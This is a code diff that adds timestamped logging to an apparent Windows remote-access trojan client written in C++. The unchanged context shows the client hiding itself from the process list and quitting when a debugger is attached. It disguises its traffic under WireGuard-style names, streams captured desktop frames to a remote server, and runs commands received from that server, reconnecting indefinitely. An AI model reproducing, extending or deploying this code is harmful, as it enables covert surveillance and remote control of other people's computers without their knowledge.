@@ -10,6 +10,8 @@
 #include <memory>
 #include <cstdint>
 #include <climits>
+#include <mutex>
+#include <iomanip>
 
 #define WIN32_LEAN_AND_MEAN
 #include <windows.h>
@@ -27,6 +29,32 @@
 
 typedef NTSTATUS (NTAPI *pNtSetInformationProcess)(HANDLE, ULONG, PVOID, ULONG);
 typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(HANDLE, ULONG, PVOID, ULONG, PULONG);
+
+class Logger {
+public:
+    enum Level { LOG_DEBUG, LOG_INFO, LOG_WARN, LOG_ERROR };
+
+    static void log(Level level, const std::string& message) {
+        auto now = std::chrono::system_clock::now();
+        auto time_t = std::chrono::system_clock::to_time_t(now);
+
+        std::lock_guard<std::mutex> lock(log_mutex_);
+        std::cout << "[" << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S") << "] "
+                  << level_strings_[level] << ": " << message << std::endl;
+    }
+
+    static void debug(const std::string& msg) { log(LOG_DEBUG, msg); }
+    static void info(const std::string& msg) { log(LOG_INFO, msg); }
+    static void warn(const std::string& msg) { log(LOG_WARN, msg); }
+    static void error(const std::string& msg) { log(LOG_ERROR, msg); }
+
+private:
+    static std::mutex log_mutex_;
+    static const char* level_strings_[4];
+};
+
+std::mutex Logger::log_mutex_;
+const char* Logger::level_strings_[4] = {"DEBUG", "INFO", "WARN", "ERROR"};
 
 class WireGuardEncoder {
 private:
@@ -384,7 +412,10 @@ private:
         size_t sent = 0;
         while (sent < len) {
             int ret = send(s, data + sent, static_cast<int>(std::min<size_t>(len - sent, INT_MAX)), 0);
-            if (ret <= 0) return false;
+            if (ret <= 0) {
+                Logger::debug("sendAll failed: " + std::to_string(WSAGetLastError()));
+                return false;
+            }
             sent += static_cast<size_t>(ret);
         }
         return true;
@@ -394,7 +425,10 @@ private:
         size_t received = 0;
         while (received < len) {
             int ret = recv(s, data + received, static_cast<int>(std::min<size_t>(len - received, INT_MAX)), 0);
-            if (ret <= 0) return false;
+            if (ret <= 0) {
+                Logger::debug("recvAll failed: " + std::to_string(WSAGetLastError()));
+                return false;
+            }
             received += static_cast<size_t>(ret);
         }
         return true;
@@ -406,21 +440,33 @@ private:
         std::vector<BYTE> packet_data = packet.serialize();
         uint32_t len = htonl(static_cast<uint32_t>(packet_data.size()));
 
-        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(&len), sizeof(len))) return false;
-        return sendAll(tcp_socket, reinterpret_cast<const char*>(packet_data.data()), packet_data.size());
+        Logger::debug("Sending packet of size " + std::to_string(packet_data.size()));
+        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(&len), sizeof(len))) {
+            Logger::debug("Failed to send packet length");
+            return false;
+        }
+        if (!sendAll(tcp_socket, reinterpret_cast<const char*>(packet_data.data()), packet_data.size())) {
+            Logger::debug("Failed to send packet payload");
+            return false;
+        }
+        return true;
     }
 
     WireGuardPacket receiveWireGuardPacket() {
         uint32_t len = 0;
         if (!recvAll(tcp_socket, reinterpret_cast<char*>(&len), sizeof(len))) {
+            Logger::debug("Failed to read packet length");
             return WireGuardPacket({});
         }
         len = ntohl(len);
+        Logger::debug("Incoming packet length: " + std::to_string(len));
         if (len == 0 || len > 10 * 1024 * 1024) {
+            Logger::debug("Invalid packet length");
             return WireGuardPacket({});
         }
         std::vector<BYTE> data(len);
         if (!recvAll(tcp_socket, reinterpret_cast<char*>(data.data()), len)) {
+            Logger::debug("Failed to read packet payload");
             return WireGuardPacket({});
         }
         return WireGuardPacket::deserialize(data);
@@ -457,6 +503,7 @@ public:
         : server_host(host), server_port(port), gen(rd()), tcp_socket(INVALID_SOCKET) {}
 
     bool initializeConnection() {
+        Logger::debug("Initializing connection to " + server_host + ":" + std::to_string(server_port));
         addrinfo hints{};
         hints.ai_family = AF_UNSPEC;
         hints.ai_socktype = SOCK_STREAM;
@@ -471,6 +518,7 @@ public:
                 if (tcp_socket == INVALID_SOCKET) continue;
 
                 if (connect(tcp_socket, rp->ai_addr, static_cast<int>(rp->ai_addrlen)) != SOCKET_ERROR) {
+                    Logger::info("Connected using resolved address");
                     break;
                 }
 
@@ -478,22 +526,28 @@ public:
                 tcp_socket = INVALID_SOCKET;
             }
             freeaddrinfo(result);
+        } else {
+            Logger::debug("getaddrinfo failed with code " + std::to_string(ret));
         }
 
         if (tcp_socket == INVALID_SOCKET) {
+            Logger::debug("Falling back to manual IPv4 connection");
             sockaddr_in addr{};
             addr.sin_family = AF_INET;
             addr.sin_port = htons(server_port);
             if (inet_pton(AF_INET, server_host.c_str(), &addr.sin_addr) != 1) {
+                Logger::error("Invalid IPv4 address");
                 return false;
             }
             tcp_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (tcp_socket == INVALID_SOCKET) {
+                Logger::error("socket creation failed");
                 return false;
             }
             if (connect(tcp_socket, reinterpret_cast<sockaddr*>(&addr), sizeof(addr)) == SOCKET_ERROR) {
                 closesocket(tcp_socket);
                 tcp_socket = INVALID_SOCKET;
+                Logger::error("Manual connect failed");
                 return false;
             }
         }
@@ -505,16 +559,21 @@ public:
         std::vector<BYTE> handshake_payload = TunnelProtocol::createTunnelPayload("handshake", "initiation");
         WireGuardPacket handshake(handshake_payload);
 
-        if (!sendWireGuardPacket(handshake)) return false;
+        if (!sendWireGuardPacket(handshake)) {
+            Logger::error("Failed to send handshake");
+            return false;
+        }
 
         WireGuardPacket response = receiveWireGuardPacket();
         auto [type, data] = TunnelProtocol::extractTunnelPayload(response.encrypted_payload);
 
         if (type == "session") {
             session_id = data;
+            Logger::info("Session established: " + session_id);
             return true;
         }
 
+        Logger::error("Handshake response invalid: " + type);
         return false;
     }
     
@@ -528,12 +587,14 @@ public:
         timeout.tv_usec = 1000;
         
         if (select(0, &readfds, nullptr, nullptr, &timeout) > 0) {
-                WireGuardPacket packet = receiveWireGuardPacket();
+            WireGuardPacket packet = receiveWireGuardPacket();
             auto [type, data] = TunnelProtocol::extractTunnelPayload(packet.encrypted_payload);
-            
+            Logger::debug("Command packet type: " + type);
+
             if (type == "input" && !data.empty()) {
                 std::vector<BYTE> decoded_data = WireGuardEncoder::decode(data);
                 std::string command(decoded_data.begin(), decoded_data.end());
+                Logger::debug("Processing remote command: " + command);
                 processRemoteCommand(command);
             }
         }
@@ -543,10 +604,11 @@ public:
         std::vector<BYTE> frameData = screen_capture.captureFrame();
 
         if (frameData.empty()) {
-            std::cerr << "captureFrame returned empty; skipping send" << std::endl;
+            Logger::warn("captureFrame returned empty; skipping send");
             return;
         }
-        
+        Logger::debug("Captured frame size: " + std::to_string(frameData.size()));
+
         bool frameChanged = true;
         if (!last_frame_data.empty() && last_frame_data.size() == frameData.size()) {
             size_t differences = 0;
@@ -559,16 +621,23 @@ public:
         if (frameChanged) {
             std::vector<BYTE> compressed = ChaChaCompressor::compressRLE(frameData);
             std::string encoded = WireGuardEncoder::encode(compressed);
-            
+
+            Logger::debug("Sending frame " +
+                          std::to_string(screen_capture.getWidth()) + "x" +
+                          std::to_string(screen_capture.getHeight()) +
+                          ", compressed to " + std::to_string(compressed.size()) + " bytes");
+
             std::stringstream payload;
             payload << session_id << "|";
             payload << screen_capture.getWidth() << "x" << screen_capture.getHeight() << "|";
             payload << encoded;
-            
+
             std::vector<BYTE> tunnel_payload = TunnelProtocol::createTunnelPayload("screen", payload.str());
             WireGuardPacket packet(tunnel_payload);
-            
-            sendWireGuardPacket(packet);
+
+            if (!sendWireGuardPacket(packet)) {
+                Logger::debug("Failed to send frame packet");
+            }
             last_frame_data = frameData;
         }
     }
@@ -576,18 +645,20 @@ public:
     void run() {
         TunnelStealth::hideFromProcessList();
         TunnelStealth::createWireGuardConfig();
-        
+
         if (TunnelStealth::isDebuggerPresent()) {
             return;
         }
-        
+
         if (!screen_capture.initialize()) {
             return;
         }
-        
+
+        Logger::info("Client run loop started");
         while (true) {
             try {
                 if (initializeConnection()) {
+                    Logger::info("Connected to server, entering streaming loop");
                     while (true) {
                         sendDesktopFrame();
                         checkForCommands();
@@ -599,21 +670,26 @@ public:
                         if (++health_check % 2000 == 0) {
                             std::vector<BYTE> keepalive_payload = TunnelProtocol::createTunnelPayload("keepalive", "ping");
                             WireGuardPacket keepalive(keepalive_payload);
+                            Logger::debug("Sending keepalive ping");
                             if (!sendWireGuardPacket(keepalive)) {
+                                Logger::debug("Keepalive failed, reconnecting");
                                 break;
                             }
                         }
                     }
                 }
-                
+
                 if (tcp_socket != INVALID_SOCKET) {
                     closesocket(tcp_socket);
                     tcp_socket = INVALID_SOCKET;
+                    Logger::debug("Socket closed");
                 }
-                
+
+                Logger::info("Reconnecting in 30 seconds");
                 std::this_thread::sleep_for(std::chrono::seconds(30));
-                
+
             } catch (...) {
+                Logger::error("Unexpected exception in run loop");
                 std::this_thread::sleep_for(std::chrono::seconds(10));
             }
         }
